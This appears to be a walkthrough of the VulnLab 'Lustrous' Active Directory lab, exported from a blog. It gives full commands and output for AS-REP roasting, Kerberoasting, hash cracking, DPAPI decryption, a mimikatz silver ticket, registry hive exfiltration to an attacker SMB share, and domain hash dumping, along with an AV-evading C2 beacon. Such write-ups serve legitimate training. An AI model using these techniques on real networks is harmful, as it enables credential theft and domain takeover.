meanwhile.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\Administrator\\Desktop&gt; .\\mimikatz.exe &quot;kerberos::golden /domain:lustrous.vl /sid:S-1-5-21-2355092754-1584501958-1513963426 /target:lusdc.lustrous.vl /service:HTTP /rc4:e67af8b3d78df5a02eb0d57b6cb60717 /user:tony.ward /id:1114 /target:lusdc.lustrous.vl /ptt&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n\n<p>This should submit the Silver ticket for the current session that we are in. It will be say <code>Golden</code> ticket at the bottom but since we’re requesting it from the context of a service account, it’s a silver ticket.</p>\n<p>Let’s now try to authenticate to the web service in our <code>tony.ward</code> login session.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(iwr http://lusdc.lustrous.vl/Internal -UseBasicParsing -UseDefaultCredentials).Content</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;td&gt;</span><br><span class=\"line\">Password Reminder</span><br><span class=\"line\">&lt;/td&gt;</span><br><span class=\"line\">&lt;td&gt;</span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">&lt;/td&gt;</span><br><span class=\"line\">&lt;td&gt;</span><br><span class=\"line\">lustrous_tony.ward</span><br></pre></td></tr></table></figure>\n\n<p>As you can see in the above output, we have successfully gained the credentials to <code>tony.ward</code> by abusing Kerberos HTTP authentication! We can now attempt to enumerate the DC as this user.</p>\n<h1 id=\"Exploiting-SeBackupPrivilege-Remotely\"><a href=\"#Exploiting-SeBackupPrivilege-Remotely\" class=\"headerlink\" title=\"Exploiting SeBackupPrivilege Remotely\"></a>Exploiting SeBackupPrivilege Remotely</h1><p>You’ll notice relatively quickly that this user does not have RDP or WinRM access, though that isn’t an overly large issue.</p>\n<p>We made the assumption that we have <code>SeBackupPrivilege</code> enabled as this user due to the name of their <code>Backup Admins</code> group. Even though we can’t access the machine and get a shell, we can still exploit this privilege remotely.</p>\n<p>To do this, we’ll use <code>impacket-reg</code> to access the registry remotely and pull the SAM, SYSTEM, and SECURITY databases from the DC. I’ve also stood up a simple SMB server through <code>impacket-smbserver</code> so we can download them to our machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-smbserver smb share/ -smb2support</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-reg lustrous.vl/&#x27;tony.ward&#x27;:&#x27;U_cPVQqEI50i1X&#x27;@10.10.169.5 -dc-ip 10.10.169.5 backup -o \\\\\\\\(IP)\\\\smb</span><br></pre></td></tr></table></figure>\n\n<p>This may take some time, as the SYSTEM database is a really large file. I’ve also ran into a few NETBIOS timeouts when running this, feel free to do a bit of trial and error with this tool. There also is an alternative with <code>BackupOperatorToDA</code>, which will perform a similar action.</p>\n<p>Another note, I’ve had luck downloading the registry hives individually, you can do so with the below commands. Just make sure to wait a bit in between downloads so you don’t receive an invalid handle error.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-reg lustrous.vl/&#x27;tony.ward&#x27;:&#x27;U_cPVQqEI50i1X&#x27;@10.10.251.85 save -keyName &#x27;HKLM\\SAM&#x27; -o \\\\\\\\10.8.0.173\\\\smb_share</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-reg lustrous.vl/&#x27;tony.ward&#x27;:&#x27;U_cPVQqEI50i1X&#x27;@10.10.251.85 save -keyName &#x27;HKLM\\SECURITY&#x27; -o \\\\\\\\10.8.0.173\\\\smb_share</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-reg lustrous.vl/&#x27;tony.ward&#x27;:&#x27;U_cPVQqEI50i1X&#x27;@10.10.251.85 save -keyName &#x27;HKLM\\SECURITY&#x27; -o \\\\\\\\10.8.0.173\\\\smb_share</span><br></pre></td></tr></table></figure>\n\n<p>After it’s finished, you should have all three files in the respective directory you used for the SMB server. We can now use these three files to dump the machine account NTLM hash for <code>LUSDC$</code>. (Make sure to close out of your SMB server so you don’t receive a <code>read-length</code> error)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Target system bootKey: 0x9619c4c8e8d0c1e1314ca899f5573926</span><br><span class=\"line\">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class=\"line\">......</span><br><span class=\"line\">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>The NTLM hash for the <code>LUSDC$</code> has the username identifier <code>$MACHINE.ACC</code>. Although these names are different, this is the same user. Now that we have credentials to the machine account, we can use <code>impacket-secretsdump</code> once more to dump the Administrator user’s NTLM hash.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-secretsdump lustrous.vl/&#x27;LUSDC$&#x27;@lusdc.lustrous.vl -hashes aad3b435b51404eeaad3b435b51404ee:[...snip...] -just-dc-user Administrator</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)</span><br><span class=\"line\">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the Administrator’s NT hash, we can now use that to authenticate via WinRM to the DC!</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/j.jpg\"></p>\n<p>We can now access the Administrator’s Desktop directory to view the root flag, in <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>. This means we have successfully completed this chain!</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/k.jpg\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>I will say that despite needing to get a nudge from a few of the other writeups, I learned a lot from this chain. Like I said before, I didn’t know you could create silver tickets to HTTP or really a lot of other services. I know for next time I do an AD box similar to this, I’ll use this experience to check out a few other avenues. Big thanks to xct for the development of this machine - it helped me learn way more than I knew before.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br><a href=\"https://github.com/BloodHoundAD/BloodHound\">https://github.com/BloodHoundAD/BloodHound</a><br><a href=\"https://github.com/HavocFramework/Havoc\">https://github.com/HavocFramework/Havoc</a><br><a href=\"https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords\">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords</a><br><a href=\"https://github.com/ParrotSec/mimikatz\">https://github.com/ParrotSec/mimikatz</a><br><a href=\"https://github.com/skelsec/pypykatz\">https://github.com/skelsec/pypykatz</a><br><a href=\"https://thebinary0x1.medium.com/lustrous-vulnlab-walkthrough-f314f8b86134\">https://thebinary0x1.medium.com/lustrous-vulnlab-walkthrough-f314f8b86134</a><br><a href=\"https://vulndev.io/2021/12/27/lab-lustrous-walkthrough/\">https://vulndev.io/2021/12/27/lab-lustrous-walkthrough/</a><br><a href=\"https://docs.axway.com/bundle/axway-open-docs/page/docs/apigtw_kerberos/kerberos_overview/index.html#:~:text=Kerberos%20authentication%20based%20on%20Simple,are%20transmitted%20in%20HTTP%20headers\">https://docs.axway.com/bundle/axway-open-docs/page/docs/apigtw_kerberos/kerberos_overview/index.html#:~:text=Kerberos%20authentication%20based%20on%20Simple,are%20transmitted%20in%20HTTP%20headers</a>.<br><a href=\"https://learn.microsoft.com/en-us/dotnet/framework/wcf/feature-details/understanding-http-authentication\">https://learn.microsoft.com/en-us/dotnet/framework/wcf/feature-details/understanding-http-authentication</a><br><a href=\"https://github.com/dirkjanm/ldapdomaindump\">https://github.com/dirkjanm/ldapdomaindump</a><br><a href=\"http://rc4.online-domain-tools.com/\">http://rc4.online-domain-tools.com/</a><br><a href=\"https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets\">https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets</a></p>\n","cover_type":"img","excerpt":"","more":"<p>This machine is an Active Directory environment that starts from the domain controller and pivots to a workstation before returning back to the DC. Given that we have two machines that are both Windows, I’d like to use Havoc instead of Sliver as our C2 for this walkthrough.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Given the IP range of the instance it seems that there are only two machines to this chain. Let’s start with our usual NMAP scans across them both.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 22:59 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.226.53</span><br><span class=\"line\">Host is up (0.12s latency).</span><br><span class=\"line\">Not shown: 985 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">21/tcp   open  ftp</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">80/tcp   open  http</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">443/tcp  open  https</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">3268/tcp open  globalcatLDAP</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 18.60 seconds</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 23:00 EDT</span><br><span class=\"line\"></span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 23:00 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.226.54</span><br><span class=\"line\">Host is up (0.13s latency).</span><br><span class=\"line\">Not shown: 996 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 23.69 seconds</span><br></pre></td></tr></table></figure>\n\n<p>I ran a few aggressive scans after this, it seems that both of these machines are Windows machines. The DC seems to be running on <code>.53</code> and a regular workstation is running on <code>.54</code>. The interesting part is that the entry point seems to be on <code>.53</code> as there are both HTTP and FTP ports enabled (with FTP having anonymous access).</p>\n<p>I’ll also note down both of the DNS names for both machines below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Machine 1 - LusDC.lustrous.vl</span><br><span class=\"line\">Machine 2 - LusMS.lustrous.vl</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"ASREP-roasting-ben-cox\"><a href=\"#ASREP-roasting-ben-cox\" class=\"headerlink\" title=\"ASREP-roasting ben.cox\"></a>ASREP-roasting <code>ben.cox</code></h1><p>Accessing the anonymous FTP instance gives us a file directory with 4 users, one of which being <code>ben.cox</code>. The file that they have in their home directory is <code>users.csv</code>, which seems to be a file that contains a few more users. I created a user list with mousepad, consisting of 5 users along with a few default users.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Administrator</span><br><span class=\"line\">Guest</span><br><span class=\"line\">krbtgt</span><br><span class=\"line\">ben.cox</span><br><span class=\"line\">rachel.parker</span><br><span class=\"line\">tony.ward</span><br><span class=\"line\">wayne.taylor</span><br><span class=\"line\">SQLServer2005SQLBrowserUser$LUSDC</span><br></pre></td></tr></table></figure>\n\n<p>Given that we have a user list, we can run some basic Kerberos tests such as <code>GetNPUsers</code> and <code>GetUserSPNs</code> to see if any users are either kerberoastable or ASREProastable.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-GetUserSPNs lustrous.vl/&#x27;Guest&#x27;@10.10.226.53 -dc-ip 10.10.226.53 -dc-host LusDC.lustrous.vl -usersfile ul.txt -request</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-GetNPUsers lustrous.vl/&#x27;Guest&#x27;@10.10.226.53 -dc-ip 10.10.226.53 -dc-host LusDC.lustrous.vl -usersfile ul.txt -request</span><br><span class=\"line\"></span><br><span class=\"line\">$krb5asrep$23$ben.cox@LUSTROUS.VL:cb02cfec[...snip..]d749d0fc98c0c0731436c</span><br></pre></td></tr></table></figure>\n\n<p>In our ASREP enumeration scan, you’ll find that <code>ben.cox</code> has pre-auth enabled. </p>\n<p>When a user is trying to authenticate to a machine in the domain, they’ll send an AS-REQ to the KDC to request for this login. If the request is valid and the authentication material is correct, the KDC will deliver an AS-REP in response to allow them to connect to their machine. If a user has <code>UF_DONT_REQUIRE_PREAUTH</code>, this means that they do not require any form of authentication or identification to request an AS-REP. The request has the users password hashed within it, meaning it is vulnerable to hash cracking.</p>\n<p>This is the case for the <code>ben.cox</code> user, as <code>impacket-GetNPUsers</code> essentially used our user list to brute force all users to determine if they have <code>UF_DONT_REQUIRE_PREAUTH</code> set. Now that we have a valid AS-REP ticket, we can use <code>hashcat</code> to see if we can crack it. Make sure to copy the AS-REP ticket to a text file before using it with hashcat.</p>\n<p>One more thing, you can find the specific hash cracking algorithm ID number to use on the example hashes website that <code>hashcat</code> provides <a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">here</a>. We’re looking at ID 18200 for cracking KRB5 ASREP hashes for the request we have.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 18200 bencox.txt /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\"></span><br><span class=\"line\">[...snip...]65fe3adb19d749d0fc98c0c0731436c:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>The above command should crack it for you, and it should return a valid password for <code>ben.cox</code>. You can verify that this works by testing it against LDAP.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.226.53 -u &#x27;ben.cox&#x27; -p &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         10.10.226.53    445    LUSDC            [*] Windows Server 2022 Build 20348 x64 (name:LUSDC) (domain:lustrous.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.226.53    389    LUSDC            [+] lustrous.vl\\ben.cox:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Dumping-the-Domain\"><a href=\"#Dumping-the-Domain\" class=\"headerlink\" title=\"Dumping the Domain\"></a>Dumping the Domain</h1><p>If you attempt to use it for other services such as RDP, you’ll notice that your creds won’t be valid. That being said now that we have valid creds to LDAP, we can use them to dump all domain objects with <a href=\"https://github.com/BloodHoundAD/BloodHound\">Bloodhound</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ bloodhound-python -d &#x27;lustrous.vl&#x27; -u &#x27;ben.cox&#x27; -p &#x27;[...snip...]&#x27; -c all -ns 10.10.226.53 --zip</span><br></pre></td></tr></table></figure>\n\n<p>This should compress all of the domain objects into an archive which is compatible with Bloodhound. Omitting <code>--zip</code> will dump all of the objects based on categories (users, machines, etc.) which are still technically compatible, it’s just much easier to do it through an archive.</p>\n<p>After starting Neo4j console and the GUI we’ll upload our data and look around for any leads with our current user.</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/b.jpg\"></p>\n<p>You’ll notice that our user <code>ben.cox</code> is within the <code>Remote Access</code> group, which I would assume is the equivalent of having <code>CanPSRemote</code> though I couldn’t verify it off of Bloodhound.</p>\n<h1 id=\"Foothold-as-ben-cox\"><a href=\"#Foothold-as-ben-cox\" class=\"headerlink\" title=\"Foothold as ben.cox\"></a>Foothold as <code>ben.cox</code></h1><p>I tested our access through WinRM, and it seems that we’re able to access <code>LusMS</code> with our credentials.</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/c.jpg\"></p>\n<p>Now that we have access through WinRM, let’s look around the machine to see if there’s anything we can download.</p>\n<p>Furthermore I also wanted to set up <a href=\"https://github.com/HavocFramework/Havoc\">Havoc C2</a> and plant a beacon onto this machine just so we can download and upload files easily. The reason as to why I’m using Havoc instead of Sliver is due to the fact that this first machine has AV enabled. Due to Havoc being a relatively new C2, the signatures for the binaries aren’t detected in the current OS that these machines are running.</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/d.jpg\"></p>\n<p>We can now look around on the machine to determine if there’s anything interesting for us to find. </p>\n<h1 id=\"DPAPI-Secure-String-Decryption\"><a href=\"#DPAPI-Secure-String-Decryption\" class=\"headerlink\" title=\"DPAPI Secure String Decryption\"></a>DPAPI Secure String Decryption</h1><p>You’ll find an odd XML file on the machine within the <code>Desktop</code> directory of <code>ben.cox</code> after a bit of searching.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\ben.cox\\Desktop&gt; cat admin.xml</span><br><span class=\"line\">&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;</span><br><span class=\"line\">&lt;S N=&quot;UserName&quot;&gt;LUSMS\\Administrator&lt;/S&gt;[...snip...]N=&quot;Password&quot;&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000d4ecf9dfb12aed4eab72b909047c4e560000000002000000000003660000c000000010000000d5ad4244981a04676e2b522e24a5e8000000000004800000a00000001000000072cd97a471d9d6379c6d8563145c9c0e48000000f31b15696fdcdfdedc9d50e1f4b83dda7f36bde64dcfb8dfe8e6d4ec059cfc3cc87fa7d7898bf28cb02352514f31ed2fb44ec44b40ef196b143cfb28ac7eff5f85c131798cb77da914000000e43aa04d2437278439a9f7f4b812ad3776345367&lt;/SS&gt;</span><br><span class=\"line\">    &lt;/Props&gt;</span><br><span class=\"line\">  &lt;/Obj&gt;</span><br><span class=\"line\">&lt;/Objs&gt;</span><br></pre></td></tr></table></figure>\n\n<p>At first you’ll think that this is a hash for the Administrator user, though it won’t be detected by <code>JTR</code> or <code>Hashcat</code> properly. That’s because it isn’t - given that <code>System.Management.Automation.PSCredential</code> specifier. This tells us that it is a <a href=\"https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords\">DPAPI credential</a> - though it’s the secure string version of the credential instead of a credential blob.</p>\n<p>DPAPI is a Windows-specific symmetric encryption of asymmetric private keys, and is used as a way to properly cache data without leaving them in plaintext around the machine. This is another method to storing credentials - as the data is encrypted using a key that is derived from the user’s logon secrets or credentials.</p>\n<p>I’ve worked with DPAPI credentials as a privilege escalation route before, and relatively straightforward. All that’s required on our behalf is to find both the <code>masterkey</code> and the <code>prekey</code> in order to decrypt the secure string. The <code>masterkey</code> can be found within <code>C:\\Users\\ben.cox\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2355092754-1584501958-1513963426-1117</code> and is denoted by the </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\ben.cox\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2355092754-1584501958-1513963426-1117&gt; Get-ChildItem . -Force</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Directory: C:\\Users\\ben.cox\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2355092754-1584501958-1513963426-1117</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">-a-hs-        12/26/2021  10:28 AM            904 BK-LUSTROUS</span><br><span class=\"line\">-a-hs-        12/26/2021  10:28 AM            740 dff9ecd4-2ab1-4eed-ab72-b909047c4e56</span><br><span class=\"line\">-a-hs-        12/26/2021  10:28 AM             24 Preferred</span><br></pre></td></tr></table></figure>\n\n<p>Normally we’d just use <a href=\"https://github.com/ParrotSec/mimikatz\">Mimikatz</a> and use the <code>masterkey</code> to decrypt the credential, but not only do we not have debug privilege to do that - we also don’t have the ability to run <code>mimikatz</code> due to our low-level privilege. (And also we aren’t dealing with a blob, but instead a secure string)</p>\n<p>We’ll need to do this locally in order to decrypt the string efficiently. We can use a tool called <a href=\"https://github.com/skelsec/pypykatz\">PyPyKatz</a>, which is a built-in tool on the latest version of Kali.</p>\n<p>First we’ll need to develop a few pre-keys to retrieve a proper plaintext <code>masterkey</code> that’s derived on the domain SID and our current user’s credentials.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ pypykatz dpapi prekey password &#x27;S-1-5-21-2355092754-1584501958-1513963426-1117&#x27; &#x27;[...snip...]&#x27;</span><br><span class=\"line\">76409e35c7b1e6cb267597498c3b9707b4884d3a</span><br><span class=\"line\">ca7dff911d9d033bfb16392388405b95a58e1896</span><br><span class=\"line\">ea6776f7e4fc1866d86e2858393ceee0c62020e0</span><br></pre></td></tr></table></figure>\n\n<p>We’ll now need to use one of these 3 pre-keys to develop the plaintext version of the <code>masterkey</code>. We can download the <code>masterkey</code> locally and use it as the file to run <code>pypykatz</code> against.</p>\n<p>I got lucky with the last pre-key, it seems that the other above it are invalid. It really all comes down to trial-and-error, run each pre-key against <code>pypykatz</code> to see which one of them works.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ pypykatz dpapi masterkey ~/tech/vl/lustrous/dff9ecd4-2ab1-4eed-ab72-b909047c4e56 ea6776f7e4fc1866d86e2858393ceee0c62020e0 -o mkf</span><br></pre></td></tr></table></figure>\n\n<p>This will save the <code>masterkey</code> into a JSON-formatted file that <code>pypykatz</code> can parse in our next command. If you don’t run it with <code>-o (filename)</code>, you’ll see that the decrypted <code>masterkey</code> will be printed out to the screen.</p>\n<p>Let’s now use our decrypted <code>masterkey</code> to decrypt the secure string. I saved the secure string to a <code>txt</code> file which seemed to work for me.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ pypykatz dpapi securestring mkf admin_1.txt</span><br><span class=\"line\">Error! non-hexadecimal number found in fromhex() arg at position 2</span><br><span class=\"line\">HEX: 58005a00390069003d006200670[...snip...]e003900640052004600</span><br><span class=\"line\">STR: [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see next to <code>STR</code> is the decrypted password for the Administrator user. Seems that we were able to decrypt it properly and can now use it to authenticate to the machine!</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/e.jpg\"></p>\n<p>The first flag is within <code>C:\\Users\\Administrator\\Desktop\\flag.txt</code>. I’ll also run our Havoc binary again so we can load a beacon as this user.</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/f.jpg\"></p>\n<p>Our next goal is to enumerate what we can do on this machine and see how we can get onto the DC.</p>\n<h1 id=\"Pivoting-to-the-DC\"><a href=\"#Pivoting-to-the-DC\" class=\"headerlink\" title=\"Pivoting to the DC\"></a>Pivoting to the DC</h1><p>So at this point, one of my pals and I were doing the chain for four to five hours and we had essentially tried everything out that we could possibly try - ADCS, LDAP Pivoting, cached credentials, password reusage, pretty much everything we could think of. I looked at the hint on the Wiki and it had told us to look at the hair of the person on the box image. I had interpreted it as white hair originally, but we when kept trying to understand what it was - we realized it had to be something with Kerberos.</p>\n<p>That being said I want to give credit where credit is due since we did need a couple nudges for this. It definitely helped me learn to think a bit outside the box, so you can find the two writeups we nudged for this section below. The credit goes to them.</p>\n<p><a href=\"https://thebinary0x1.medium.com/lustrous-vulnlab-walkthrough-f314f8b86134\">https://thebinary0x1.medium.com/lustrous-vulnlab-walkthrough-f314f8b86134</a> - <code>nmht3t</code><br><a href=\"https://vulndev.io/2021/12/27/lab-lustrous-walkthrough/\">https://vulndev.io/2021/12/27/lab-lustrous-walkthrough/</a> - <code>xct</code></p>\n<p>So if you had looked around the DC - you would’ve seen that port 80 was open. When accessing this, you would’ve immediately come into a regular IIS website that doesn’t really tell you much. Brute forcing the directories doesn’t help with much either - as there isn’t anything out of the ordinary to compromise. However, if you had bound the DC’s domain name, <code>LusDC.lustrous.vl</code> to the IP address of the DC, you’ll come into contact with another page if you try to access it through HTTP.</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/g.jpg\"></p>\n<p>Right now it’s telling us that we do not have access to the website due to invalid credentials. But that’s odd right - it didn’t prompt us to enter in any credentials beforehand.</p>\n<p>This is where a new type of authorization came into picture that I have never learned about before - Kerberos authentication to HTTP.</p>\n<h1 id=\"Kerberos-Authentication-to-HTTP\"><a href=\"#Kerberos-Authentication-to-HTTP\" class=\"headerlink\" title=\"Kerberos Authentication to HTTP\"></a>Kerberos Authentication to HTTP</h1><p>So I’ve done alternate service delegation before with Cobalt Strike - and most of what I’ve done involved CIFS, LDAP, and MSSQL. What’s interesting is that these are not the only services in AD that use Kerberos Authentication. There’s a wide variety of services that can be used for Kerberos auth, and in our case we’ll be looking at HTTP. You can find some resources for HTTP authentication through Kerberos <a href=\"https://docs.axway.com/bundle/axway-open-docs/page/docs/apigtw_kerberos/kerberos_overview/index.html#:~:text=Kerberos%20authentication%20based%20on%20Simple,are%20transmitted%20in%20HTTP%20headers.\">here</a> and <a href=\"https://learn.microsoft.com/en-us/dotnet/framework/wcf/feature-details/understanding-http-authentication\">here</a>.</p>\n<p>Essentially, Kerberos authentication can be passed into HTTP headers based on the context of the current user that is trying to access it. Service tokens are issued in the context of the user and they are injected into headers before accessing the site. If the user has the correct header in relation to the service’s cache, they’ll be allowed access into the web service.</p>\n<p>For our case, we can actually access this website through a logon session as <code>ben.cox</code>. You’ll need to access RDP through the <code>LusMS</code> machine as the Administrator since <code>ben.cox</code> does not have RDP logon privileges.</p>\n<p>If you try to access the website through Edge, you’ll get redirected to an actual login panel.</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/h.jpg\"></p>\n<p>We won’t be able to authenticate with our Administrator credentials since they’re specific to our machine - but we can access with <code>ben.cox</code>‘s credentials since they’re a domain user.</p>\n<p>You’ll get redirected to a website called <code>Secure Notes</code>, which seems to be utilizing SSO to authenticate to our machine. This is what we had inferred originally, so it looks like we are correct.</p>\n<p>Within the <code>Notes</code> tab, you’ll find an interesting web page that seems to be a password reminder.</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/i.jpg\"></p>\n<p>The password for <code>ben.cox</code> seems to be relayed in plaintext. We can guess from here that any user that accesses this website using their credentials will have their password printed in plaintext in this specific tab. We also are reaffirmed of our Kerberos authentication theory in the <code>Task</code> row underneath the password.</p>\n<p>So from here - we’ll need compromise other users and get them to authenticate to this website in order to retrieve this password.</p>\n<p>In order to do this - we’ll need to use another account as <code>ben.cox</code> does not have any pertinent permissions&#x2F;delegation over any of the other domain users. However, if you’ll take a look back at Bloodhound, there are around 26 domain users that are within this domain. We had only tried to Kerberoast&#x2F;ASREProast four of them at the beginning of this machine, so let’s see if there are any other tickets we can retrieve with those user.</p>\n<p>I made a one-liner that creates a user list based on <a href=\"https://github.com/dirkjanm/ldapdomaindump\">LDAPDomainDump</a>. This required dumping the domain once more, to which I also believe this is a built-in Kali tool. We’ll use the <code>domain_users.json</code> file as the file to create a wordlist with, which should be generated automatically when we dump LDAP again.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat domain_users.json | grep &#x27;@lustrous.vl&#x27; | awk &#x27;&#123;print $1&#125;&#x27; | cut -d &#x27;&quot;&#x27; -f 2 | cut -d &#x27;@&#x27; -f 1 &gt; inc_list.txt</span><br></pre></td></tr></table></figure>\n\n<p>We now have a user list to use, and we’ll <code>GetUserSPNs</code> once more to test for Kerberoasting.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-GetUserSPNs -dc-ip 10.10.169.5 -usersfile inc_list.txt -request lustrous.vl/&#x27;ben.cox&#x27;:&#x27;Trinity1&#x27;</span><br><span class=\"line\">......</span><br><span class=\"line\">$krb5tgs$23$*svc_db$LUSTROUS.VL$svc_db*$4a204336b40ac1892e413b8f5da6[...snip...]</span><br><span class=\"line\">$krb5tgs$23$*svc_web$LUSTROUS.VL$svc_web*$0e561f7154d282c3b6f0f00eb40d67f2$23e81c[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, we received two hits for <code>svc_db</code> and <code>svc_web</code>. We can crack both of these Kerberos tickets to attempt to receive a password for either of these users.</p>\n<p>We’ll use <a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">hashcat</a> for this as it has an identifier to crack Kerberos 5 <code>e-type 23</code> TGS-REP tickets. The identifier that we’ll need to use is <code>13100</code>.</p>\n<p>You won’t find any hits for <code>svc_db</code>, but you will for the <code>svc_web</code> user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 13100 wr_svc_web.txt /usr/share/wordlists/rockyou.txt</span><br><span 